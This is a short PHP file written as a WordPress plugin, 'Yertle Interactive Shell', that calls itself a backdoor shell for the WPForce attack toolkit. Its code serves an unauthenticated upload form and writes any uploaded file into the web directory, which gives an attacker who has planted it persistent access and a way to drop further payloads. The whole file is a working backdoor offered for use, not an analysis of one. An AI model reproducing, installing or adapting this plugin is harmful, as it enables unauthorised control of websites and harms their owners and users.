<?php
    /*
    Plugin Name: Yertle Interactive Shell
    Plugin URI: https://github.com/n00py
    Description: This is a backdoor PHP shell designed to be used with the Yertle script from WPForce.
    Version: 0.1
    Author URI: https://github.com/n00py
    */

// Copied and modified from https://github.com/leonjza/wordpress-shell
    echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload">
</form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>';}}?>
